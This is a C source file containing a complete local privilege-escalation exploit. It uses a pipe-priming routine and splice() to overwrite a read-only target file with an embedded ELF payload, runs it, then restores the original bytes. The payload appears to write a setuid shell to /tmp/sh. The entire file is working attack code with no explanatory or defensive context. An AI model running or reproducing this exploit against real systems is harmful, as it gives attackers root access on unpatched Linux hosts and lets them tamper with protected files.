#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef BUF_SIZE
#define BUF_SIZE 4096
#endif

unsigned char payload[] = {
    0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
    0x70, 0x2f, 0x73, 0x68, 0x00
};

static void setup_pipe(int p[2]) {
    if (pipe(p)) abort();

    const unsigned size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[BUF_SIZE];

    for (unsigned remaining = size; remaining > 0;) {
        unsigned chunk = remaining > sizeof(buffer) ? sizeof(buffer) : remaining;
        write(p[1], buffer, chunk);
        remaining -= chunk;
    }

    for (unsigned remaining = size; remaining > 0;) {
        unsigned chunk = remaining > sizeof(buffer) ? sizeof(buffer) : remaining;
        read(p[0], buffer, chunk);
        remaining -= chunk;
    }
}

int overwrite_file(char *path, long offset, uint8_t *data, size_t len) {
    const int file = open(path, O_RDONLY);
    if (file < 0) {
        perror("open failed");
        return -1;
    }

    struct stat file_info;
    if (fstat(file, &file_info)) {
        perror("stat failed");
        return -1;
    }

    int p[2];
    setup_pipe(p);

    --offset;
    ssize_t splice_result = splice(file, &offset, p[1], NULL, 1, 0);
    if (splice_result < 0) {
        perror("splice failed");
        return -1;
    }
    if (splice_result == 0) {
        fprintf(stderr, "splice returned 0");
        return -1;
    }

    ssize_t write_result = write(p[1], data, len);
    if (write_result < 0) {
        perror("write failed");
        return -1;
    }
    if ((size_t)write_result < len) {
        fprintf(stderr, "partial write");
        return -1;
    }

    close(file);

    return 0;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s TARGET_FILE\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target = argv[1];
    uint8_t *payload_data = payload;

    int file = open(target, O_RDONLY);
    uint8_t *backup_data = malloc(sizeof(payload));
    lseek(file, 1, SEEK_SET);
    read(file, backup_data, sizeof(payload));
    close(file);

    printf("[+] Modifying target file..\n");
    if (overwrite_file(target, 1, payload, sizeof(payload)) != 0) {
        printf("[~] Modification failed\n");
        return EXIT_FAILURE;
    }

    printf("[+] Executing payload..\n");
    system(target);

    printf("[+] Restoring target file..\n");
    if (overwrite_file(target, 1, backup_data, sizeof(payload)) != 0) {
        printf("[~] Restoration failed\n");
        return EXIT_FAILURE;
    }

    printf("[+] Done\n");
    return EXIT_SUCCESS;
}
